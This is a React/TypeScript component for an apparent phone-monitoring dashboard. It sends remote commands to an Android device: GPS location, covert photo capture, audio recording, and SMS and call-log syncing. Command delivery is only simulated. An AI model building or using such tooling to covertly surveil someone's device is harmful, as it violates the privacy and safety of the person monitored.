import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '../ui/Card';
import { Button } from '../ui/Button';
import { 
  MapPin, 
  Camera, 
  Mic, 
  RefreshCw, 
  Smartphone, 
  MessageSquare,
  Send,
  AlertTriangle
} from 'lucide-react';

interface CommandCenterProps {
  selectedDeviceId?: string;
  onCommandSent?: (command: string, deviceId: string) => void;
}

interface Command {
  id: string;
  name: string;
  description: string;
  icon: React.ReactNode;
  variant: 'primary' | 'secondary' | 'danger';
  requiresConfirmation?: boolean;
}

export function CommandCenter({ selectedDeviceId, onCommandSent }: CommandCenterProps) {
  const [loadingCommand, setLoadingCommand] = useState<string | null>(null);
  const [showConfirmation, setShowConfirmation] = useState<string | null>(null);

  const commands: Command[] = [
    {
      id: 'get_location',
      name: 'Get Location',
      description: 'Request current GPS location',
      icon: <MapPin className="h-4 w-4" />,
      variant: 'primary',
    },
    {
      id: 'take_photo',
      name: 'Take Photo',
      description: 'Capture photo remotely',
      icon: <Camera className="h-4 w-4" />,
      variant: 'secondary',
      requiresConfirmation: true,
    },
    {
      id: 'record_audio',
      name: 'Record Audio',
      description: 'Record 30-second audio clip',
      icon: <Mic className="h-4 w-4" />,
      variant: 'secondary',
      requiresConfirmation: true,
    },
    {
      id: 'sync_sms',
      name: 'Sync SMS',
      description: 'Force SMS synchronization',
      icon: <MessageSquare className="h-4 w-4" />,
      variant: 'primary',
    },
    {
      id: 'sync_calls',
      name: 'Sync Calls',
      description: 'Force call log synchronization',
      icon: <Smartphone className="h-4 w-4" />,
      variant: 'primary',
    },
    {
      id: 'restart_service',
      name: 'Restart Service',
      description: 'Restart monitoring service',
      icon: <RefreshCw className="h-4 w-4" />,
      variant: 'danger',
      requiresConfirmation: true,
    },
  ];

  const handleCommandClick = (command: Command) => {
    if (!selectedDeviceId) return;

    if (command.requiresConfirmation) {
      setShowConfirmation(command.id);
    } else {
      executeCommand(command.id);
    }
  };

  const executeCommand = async (commandId: string) => {
    if (!selectedDeviceId) return;

    setLoadingCommand(commandId);
    setShowConfirmation(null);

    try {
      // Here you would send the command to Firebase
      // For now, we'll simulate the command execution
      await sendCommandToDevice(commandId, selectedDeviceId);
      onCommandSent?.(commandId, selectedDeviceId);
    } catch (error) {
      console.error('Failed to send command:', error);
    } finally {
      setLoadingCommand(null);
    }
  };

  const sendCommandToDevice = async (commandId: string, deviceId: string): Promise<void> => {
    // This would integrate with Firebase Cloud Messaging
    // to send commands to the Android device
    return new Promise((resolve) => {
      setTimeout(() => {
        console.log(`Command ${commandId} sent to device ${deviceId}`);
        resolve();
      }, 1000);
    });
  };

  if (!selectedDeviceId) {
    return (
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center">
            <Send className="h-5 w-5 mr-2" />
            Remote Commands
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="text-center py-8 text-gray-500">
            <Smartphone className="h-12 w-12 mx-auto mb-4 opacity-50" />
            <p>Select a device to send commands</p>
            <p className="text-sm mt-1">Choose a device from the list to enable remote control</p>
          </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center">
          <Send className="h-5 w-5 mr-2" />
          Remote Commands
        </CardTitle>
        <p className="text-sm text-gray-600 mt-1">
          Device: {selectedDeviceId.substring(0, 12)}...
        </p>
      </CardHeader>
      <CardContent>
        <div className="grid grid-cols-1 gap-3">
          {commands.map((command) => (
            <div key={command.id}>
              <Button
                variant={command.variant}
                size="md"
                className="w-full justify-start"
                loading={loadingCommand === command.id}
                disabled={loadingCommand !== null}
                onClick={() => handleCommandClick(command)}
              >
                <span className="mr-3">{command.icon}</span>
                <div className="text-left">
                  <div className="font-medium">{command.name}</div>
                  <div className="text-xs opacity-75">{command.description}</div>
                </div>
              </Button>

              {showConfirmation === command.id && (
                <div className="mt-2 p-3 bg-yellow-50 border border-yellow-200 rounded-md">
                  <div className="flex items-start">
                    <AlertTriangle className="h-5 w-5 text-yellow-600 mt-0.5 mr-2" />
                    <div className="flex-1">
                      <p className="text-sm font-medium text-yellow-800">
                        Confirm Command
                      </p>
                      <p className="text-sm text-yellow-700 mt-1">
                        Are you sure you want to execute "{command.name}" on the selected device?
                      </p>
                      <div className="mt-3 flex space-x-2">
                        <Button
                          size="sm"
                          variant="danger"
                          onClick={() => executeCommand(command.id)}
                        >
                          Confirm
                        </Button>
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => setShowConfirmation(null)}
                        >
                          Cancel
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        <div className="mt-6 p-4 bg-gray-50 rounded-md">
          <p className="text-xs text-gray-600">
            <strong>Note:</strong> Commands are sent securely via Firebase Cloud Messaging. 
            The device must be online to receive and execute commands.
          </p>
        </div>
      </CardContent>
    </Card>
  );
}